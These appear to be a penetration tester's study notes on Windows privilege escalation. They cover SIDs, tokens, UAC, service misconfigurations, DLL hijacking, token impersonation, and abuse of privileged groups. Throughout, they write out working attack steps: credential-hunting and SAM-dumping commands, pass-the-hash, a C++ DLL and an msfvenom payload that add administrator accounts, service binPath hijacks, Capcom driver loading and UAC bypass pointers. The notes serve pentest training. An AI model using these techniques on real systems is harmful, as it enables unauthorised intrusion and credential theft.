## Privileges and Access Control Mechanisms
### Security Identifier
SID is a unique value assigned to each entity, principal, that can be authenticated b WIndows, such as users and groups.
The SID for local accounts is created by the *Local Security Authority*. For Domain accounts it is created by the *Domain Controller*
SID contains differrent parts, delimited by the -. Format "S-R-X-Y"
	S: Just an S, inidcating this is a string
	R: Revision, always set to 1 since format is still the original structure
	X: Determines the indentifier authourity. This is the issuer of the SID. Most common is 5 for NT Authority
	Y: COnatins the sub domain identifiers and relative indentifiers. The last number is like UID on Linux
	Example: S-1-5-21-1336799502-1441772794-948155058-1001
User SIDs start at 1000, but there are built in accounts with SID lower than 1000. SOme that may be useful for priv esc:
	S-1-0-0                       Nobody        
	S-1-1-0	                      Everybody
	S-1-5-11                      Authenticated Users
	S-1-5-18                      Local System
	S-1-5-domainidentifier-500    Administrator
### Access Tokens
Once a User is authenticated Windows generates an access token assigned to that user. This token details all of their privileges.
When a user starts a process or thread, a token willl be assigned to these objects
A thread can also have an impersonation token designed to provide a different security context
WIndows also implements 5 integrity levels. A process from a lower level cannot write to a process with a higher one:
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
### User Account Control
WIndows Security Feature that runs most apps as unprivileged users, even if on an admin account. A user access prompt must be confirmed to run applications as admin

### Enumerate Apps
```Powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Above command shows all 32 bit applications installed
```Powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Above command shows all 32 bit applications installed

### Hidden in Plain View
Be sure to check plain text files for valuable information. Text files, configuration files, onboarding docs, etc may contain passwords
Once we identify what software is on the system, we can try to search for config files and databases that might have sensitive info
We can use the Get-ChildItem cmdlet in PowerShell to do this
```Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
The above example searches for the password manager database
```Powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
The above example searches for both .txt and .ini files related to the xampp software
We can also search for plaintext documents under a users home directory
```Powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
If we recover other users credentials we should test them. If they are successful, make sure to go back and repeat the "gathering sensitive info" steps because permissions change.

==If we recover valid credentials we can use the Runas command to run programs as different users only if we have a GUI. 
If th user has Log on as batch job access, we can schedule a task or program as them
If the user has ActiveSession, we can use PsExec from Sysinternals==

```Powershell
runas /user:backupadmin cmd
```
Additioanlly to elevate to an admin command prompt we can use
```cmd
powershell -Command "Start-Process cmd -Verb RunAs"
```

`set` --> returns environment variables
`tasklist /svc` --> shows running tasks

#### Dictionary Files
Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

#### Sticky Notes
People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

Exfil to kali to view or can view in powershell by running `strings` on the file or importing  the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite).

#### Other files of interest
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software.

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools.

#### CLipboard
We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.
### Inspecting Powershell Logs
In an enterprise setting we can see if Powershell logging is enabled. Two important mechanisms are Powershell Transcription and Powershell Script Block
Transcript files log everything a user types and are usually saved in the home directories of users, once central directory, or one central network share.
Script Block logging records commands and blocks of scriptcode while executing. This results in logging the full context of code execution. --> *We can search through this log in event viewer if it is enabled*. Logs are located under Application and service logs --> Microsoft --> Windows --> Powershell --> Operational. Task category execute remote command was helpful for the exercise
We can also use the `Get-History` cmdlet in PowerShell to obtain a list of past commands
Note: the Clear-History cmdlet the admins use only clears the history that the Get-History cmdlet retrieves. We can use the PSReadline module to potentially locate a history file that is unaffected
```Powershell
(Get-PSReadlineOption).HistorySavePath
```
The above command will print the file path to the console history file. The syntax with parenthesis allows use to select the one desired option for the module
We can check the history file for commands containing sensitive data

If credentials are recovered and we try to pivot accounts, We should note that creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior. --> we can use evil-winrm from our kali machine to pivot instead.
	evil-winrm provides various functions, such as, pass the hash, in memory loading, file upload/download.
```Powershell
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```
Note we have to escape special characters with "\\" since we are in linux

## Inspecting procceses
the following script will catch proccesses being passed through CMD --> we can look for creds being passed

```shell-session
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```


#### Powershell saved credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

Code: powershell

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

  Credential Hunting

```powershell-session
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```
### Automating Enumeration
https://github.com/carlospolop/PEASS-ng/releases/latest
WinPEAS :)
also SeatBelt
don't forget to do manual enumeration too


"C:\Windows\Temp is usually world writeable. Try pulling files into there"

Pay attention  to services we can restart

check privileges
	can abuse SeDebugPrivilege, SeImpersoantePrivilege
		SeImpersonate allows a user to impersonate other tokens such as Admin tokens
	

MOVING FILES ONTO REMOTE TARGET
	-Host simple http server and pull in from rhost
		on lhost: 
	- Can try to use upload feature of services running on host

Check for services that have open file permissions

## Kernel Exploits

enumerate windows version and patches
FInd matching exploits
compile and run
use as last resort
Windows exploit suggester takes output of sysinfo commnand to find exploits
Precompiled Kernel exploits at SecWiki/windows-kernel-exploits github
Watson another tool option
==HTB Academy has a great table==
## Service exploits

Services that run with system privilege and are misconfigured are exploitable
some useful commands for running services
	query the config of a service:
		sc.exe qc name
	Query the current status of a service
		sc.exe query name
	Modify a config option of a service
		sc.exe config name \<option\>= \<value\>
	Start/stop a service
		net start/stop \<name\>
To see all services running
services.msc in the GUI
```PowerShell
Get-Service
or
Get-CimInstance
```
**When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.**
```Powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
or we can use the example below to see all services
```Powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```
If we see services installed not in Windows/system32 directory they are likely user installed and more likely to be insecure
**We can use icacls to see the file permissions**
	|MASK|PERMISSIONS|
	|Mask| Permision|
	|F|  Full access|
	|M|  Modify access|
	|RX| Read and execute access|
	|R|   Read-only access|
	|W|  Write-only access|
```
icacls 
```

### Insecure Service properties
Each service has ACLs that define service permission
Dangerous ones include:
- SERVICE_CHANGE_CONFIG - changes config of service
- SERVICE_ALL_ACCESS - have full control over service
If user has permission to change service config we can point it towards our reverse shell executable.
	Potential rabbit hole: If we cannot start and stop the service we may not be able to escalate privileges
Vulnerable services seen under the "modifiable services" section in WINPEAS
We can query the config of a service to see info about when it starts, executable to run, etc
Easiest way to exploit this is to set the binary path to the reverse shell

we can cross compile exploits for windows using the command:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Powerup.PS1 can also help identify services



### Unquoted Service Path
Executables in windows can be run without their extension
If there are spaces in an unquoted service path it is ambiguous to windows
It will check all options to see what is executable --> if we can put an executable into one of these places we can trick windows into running it
see the "unquoted service" output of WINPEAS for this
- check if we have access to start the "unqoutedsvc" service
- then check if we can write to any of the directories in the path of the unquotedsvc file
- Put reverse executable shell in path and start service
For example if we called `C:\Program Files\My Program\My Service\service.exe` without quotes, Windows would do the following checks:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
In the context of the example, we could name our executable **Program.exe** and place it in C:\\, **My.exe** and place it in C:\\Program Files\\, or **My.exe** and place it in C:\\Program Files\\My Program\\. However, the first two options would require some unlikely permissions since standard users don't have the permissions to write to these directories by default.

We can use the command below to observe service paths with spaces
```cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
Once a potential Service is found, ==Make sure we can start and stop the service and check permission on the potential folder==
`icacls <folder>` can be used to check permission

### Weak registry Permissions
If ACLS are misconfigured it may be possible to modify a service's configuration even if we can't modify the service directly
NT Authority\\Interactive is the group of all users who can log in locally to the system. We can check privilege on this group looking for KEY_ALL_ACCESS --> this will allow us to overwrite the registry key. Want t overwrite the image path value for the regsvc service
This has the same effect of changing the bin path of the service

### Insecure Service Executables
if the original service is modifiable by the user we can simply replace it with our reverse shell
These will be executables that are writeable by everyone
make sure we back up original service
simply overwrite service with reverse shell executable and run service



### DLL Hijacking
executables try to run functionality from DLL
if a DLL is loaded from an absolute path, it might be possible to escalate privileges if that DLL is writable by our user
More commonly if a DLL is missing and our user has write access to DLL paths we can put malicious code there
process is very manual
- look for non microsoft services
- see what we have start and stop permission for
- see what executable the service runs
- copy .exe file off the machine to a windwos host you have admin priv on
- run process monitor to analyze
- stop and clear current process
- CTRL+L to set a new filter --> filter on copied over service --> proocess name filter
-  deselect show registry activity and show network activity and start againa
- in cmd prompt start the service
- in procmon we can see where windows is looking for DLL files --> identify if there are writable directories on target machine
- Place reverse shell executable in identified directory --> make sure to match the name of the .dll file the service is looking for
Standard DLL Loading order:
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
We do need to copy the binary to a local machine and use Process Monitor aka Procmon to identify which DLLs are being loaded --> no being lazy with this one
ProcMon give a lot of info. We are going to want to filter on a  serivce's name--> Proccess Name, is, "name", include --> filter
Note: name is the executable name, not the service name assigned using SC create
Once the filter is in place we want to restart the service. We can use net start/stop or `Restart-Service <name>` in PowerShell
We want to browse the CreateFile function logs --> this is the function that creates or opens files
If we see a DLL not loaded we can simply write a DLL file with the called name to a path used by the program for DLLs
install the service using:
```cmd
SC CREATE "svc_name" bin ="Path to executable"
```

#### Writing Malicious DLL
Below is the default code/structure for DLLs. There are for main cases for dll use. We are concerned with DLL_Process attach because that is the case when a service is loading a dll. Also note, no code will execute unless the DllMain function is specified
```C++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Taking the above format we can  add our malicious code in the dll process attach case. We also add some standard c++ headers
```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
we can cross-compile thos code on kali using the mingw32-gcc
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
Note: we need the --shared flag for  dll
Now all we need to do is place the dll within the path and execute the serivce
cd 

### disable safe load mode
The default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.

1. Press `Windows key + R` to open the Run dialog box.
2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.
3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.

With this mode enabled, applications search for necessary DLL files in the following sequence:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory
6. The directories that are listed in the PATH environment variable
## Registry exploits
### Auto run
Autoruns are configured with registries.
If you are able to write an Autorun executable and are able to restart the system you may be able to escalate privilege
check if we can write to any autorun application
we can query the registry Current Version\\Run to see all autorun programs
we can then check if files are writable
find writable program\\directory --> just need to overwrite file and restart computer
might need to have admin logged in last for this to work
### MSI files
msi files can run as admin, but can be executed by the user --> if we can generate malicious msi file we can get  elevate privileges
==need AlwaysInstalledElevated registry set in two spots for this to work==
- HKLM\\SOFTWARE\\Policies\\Microsft\\Windows\\Installer --> allows MSI files to run on system
- HKCU\\Software\\Policies\\Microsoft\\windows\\Installer --> allows user to run msi files
Just need to copy over malicious msi file and execute it

## Passwords
Check system for passowrds in readable locations
check windows registry for plaintext passwords
Following commands will search registries for keys and values that contain the plaintext "password"
- reg query HKLM /f password /t REG_SZ /s --> queires local machine entires
- reg query HKCU /f password /t REG_SZ /s --> queries current user entries
These will generate a lot of results
WINPEAS will also output any plaintext or autologon creds it finds in registries
if any account creds are found we can use the winexe command to spawn a shell
```cmd
winexe -U 'user%password' //<ip> cmd.exe
```
can use this with --system option to spawn system shell
### saved creds
windows allows users to save creds to the system to be used with runas
cmdkey /list --> will show saved credentials for the current user
```cmd
runas /savedcred /user:admin <path to malicious exe>
```

### config files
look for config files with plaintext creds --> Unattend.xml is an example
useful commands:
- dir /s \*pass\* == \*.config --> searches for files in current directory with pass in name for .config
- findstr /si password \*.xml \*.ini \*.txt --> recursively search for files in the current directory that contain "password" and end in those extensions
WINPEAS has a check for "known files that may contain credentials"
NOTE: Passwords may be base 64 encoded

### SAM
windows stores password hashes in the Security account administrator (SAM)
Key to decrypt hashes can be found in a file named SYSTEM
FILES are located at: C:\\WIndows\\System32\\config direotry
Backups may exist in C:\\WIndows\\Repair or C:\\WIndows\\SYstem32\\config\\regback directory
if files are found copy them back to Kali
make sure we have latest version of **pwdump** too as part of the cred-dump7 suite or similar
first part is LM hash, second part is NTLM hash
	hashes that start with 381c are either empty password or account is disables
==Something about SAM can be recovered with "reg" command. Need to investigate use and rperequisites==
I think being a service accoutn is a sufficent pre req
SAM hashes can also be recovered using the commands 
```cmd
reg save hklm\system system
reg save hklm\sam sam
```
~~Then on kali we use the tool samdump2 to get the decrypted hashes~~ **Note this command gave blank hashes. Use pypykatz first**
```
root@~/tools/mitre/pwdump# samdump2 system sam 
```
pypykatz command to use:
```bash
pypykatz registry --sam sam system
```


### Pass the hash
windows accepts hahses to a number of services
we can pass the hash to open a new terminal
```cmd
pth-winexe -U 'user%LM:NTLM' //<ip> cmd.exe
```
note: we need to supply both LM and NTLM hashes in the password field
==Refer to Password Attacks for more info on cracking and passing NTLM==
potentially useful tools:
impacket-psexec
impacket-wmiexec
pth-*
## Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```
```PS
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
Above commands will query all scheduled tasks visible to user
often times we need to finds scripts or logs to hint at tasks being run
manually enumerate interesting drives
use access check to see permissions for script files
if  we can edit file simply add code to call out to our machine and set up listener
There are three main details we are concerned about with reconning tasks for priv esc"
- which user account (principal) does the task execute as?
	- we want NT Authority\System or an admin user
- what triggers are specified for the task
	- If the task is triggered it will not run again
- what actions are executed when the triggers are met
	- Depenending ont he action we can use other tactics discussed in these notes


## GUI Apps
Some versions of windows, users could be granted the permission to run certain GUI apps with admin priv
any child methods spawned will still be system level
open an admin gui app
```cmd
tasklist /V | finsstr <exe file for app>
```
in app
- file --> open
- in nav bar: "file//c:/windows/system32/cmd.exe
this should spawn command prompt

## Startup Apps
users can define apps that start when they login
C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Progams\\StartUp --> dir where programs start for all users.
If we can write a exe to this directory we can get a reverse shell upon admin login

## installed apps
we can use exploit db web interface and filter on apps that have privesc
Most of these exploits will rely on the same permissions covered above
buffer overflow exploits will add value here
tasklist command will show all running processes
WINPEAS process info option can callout non standard process
checkthese against exploitdb

## Hot Potato
Spoofing attack along with NTLM relay attack that tricks system into authenticating to http server
Only works on win 7,8, and early 10
need compiled exploit
```cmd
.\potato.exe -ip <ip> -cmd <path to malicious exe> -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Token Impersonation
SeImpersonatePrivilege
SEAssign primary token --> these two user tokens allow an account to impersonate the access tokens of other users.
these are usually enabled on Service accounts
### Rotten Potato
limited exploit
### Juicy Potato
similar to rotten potato but better --> patched in win10 now
run from service account
port 1337 must be available and the CLSID must be valid
can get reverse shells of service accounts by compromising services
### Rogue Potato
Latest of the potatoes
github/antonioCoco/RougePotato

### Printspoofer
exploit that targets print spooler service
github/itm4n/PrintSpoofer
need redistributable C++ 

## Port Forwarding
Sometimes it is easier to run exploit code on kali, but the vulnerable program is listening on an internal port.
In these cases we need to forward a port on kali to the internal port on windows
we can do this using a program called plink.exe
can run plink on windows
kill SMB server running on kali because we need to forward that port
Also need ssh service in kali to allow root login with password
ssh service restart
run .\\plink.exe root@ip -R 445:127.0.0.1:445
This will forward the kali smb port to the windows internal port
Back on regular kali machine we modify the desired command to point to local port we forwarded. this will reach the windows port

## Strategy
- Check user and groups
- Run WINPEAS with fast, searchfast and cmd options
- Run Seatbelt & Other scripts as well
- If all else fails run manual commands

Be patient and read over all results of enumeration --> for each finding create a checklist of everything you need to work
Have a quick look around for files on user desktop and other common locations
try things that don't have many steps first
have a good look at admin processes and enumerate versions --> search for exploits
check internal ports we can forward to as well
If we still don't have shell re read dumps and highlight anything that seems odd

## Named Pipes


## Getsystem
Processes are able to create named pipes so other processes can read/write from it
process which creates the named pipe can impersonate the security context of the process that connects to the named pipe
getsystem is the metasploit command that exploits this automatically

## Abusing User privileges
github/hatRiot/Tokenptiv is a good resource to learn about these
whoami /priv --> list privileges, you have everything listed

SeImpersonatePrivilege
	grants ability to impersonate any access tokens which it can obtain
	if an access token from system process can be obtained, a new process can be spawned using that token
SeAssignPrimary Privilege
Similar to impersonate
SeBackupPrivilege
provides read access to all objects on the system --> Can gain access to sensitive files or extract hashes on the registry
SeRestorePrivilege --> write access to everyhtin on the system --> can modify service binary overwrite DLLs used by the system, modify registry settings
SeTakeOwnership --> let's user take write ownership of object --> can change ACL
Other
	SeTcbPrivielge
	SeCreateTokenPrivilege
	seLoadDriverPrivilege
	SeDebugPrivilege

To abuse access to SeImpersonatePrivilege we need to coerce a privileged process into connecting to us via a controlled named pipe. **We can use Printspoofer or the potato tools listed above under token impersonation to execute this type of attack**

 We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

Backup operators
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
```
 diskshadow.exe
```
```
dir E:\
```

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

Event log readers
we can search windows logs for credentials
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
Above commands look for user flag specified --> often password is also passed cmd line

For `Get-WinEvent`, the syntax is as follows. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.

Note: Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient.

```powershell-session
C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

DNS Admin
- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
	
setup
- we can generate a malicious DLL to add a user to the domain admins group
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
run the dnscmd to set the path for the dll
```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```
==Must specify full path of the dll==
need to restart dns server/service for attack to execute
check permision for dns restart
```cmd-session
sc.exe sdshow DNS
```
How to read results:  Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/),

Print Operators
	[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.
	The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line.
	It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.
 We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.
```cmd
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```
Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Enable privilege using  `EnableSeLoadDriverPrivilege.exe` binary.
Verify Capcom driver is listed
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```
To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

Server Operators
Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services. --> we can change the binary path of a local service that runs as SYSTEM
```cmd
 sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
Use `sc` or `PsService.exe` from sysinternals suite to confirm access over service

## UAC Bypass
Check if UAC is enabled
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
Check UAC Level
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
5 means always notify
The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.
check os version
```powershell
[environment]::OSVersion.Version
```
find example for your build and follow directions
# Misc
If we have access to Mysql databse that can write files as system, we can use the wertrigger privilege esc steps: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger


--------------------Tools/Scripts----------------------------------------

PowerUp.ps1 
	To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
	Use:
	. .\PowerUp.ps1
	Invoke-Allchecks
	Output:
	will output various misconfigured services
	==Only llooks for a subset of misconfigs== run other tools too

winPEAS
	to get colors: REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
	red = good for hacker
	green = good for defender
	this should be a go to

SHarpUp
	C# compiled version of Powerup if powershell unavailable
Seatbelt
	will output info related to priv esc opportunities, but will not find them or point them out

|                                                                                                          |                                                                                                                                                                                                                                                                                                                           |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                          |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |
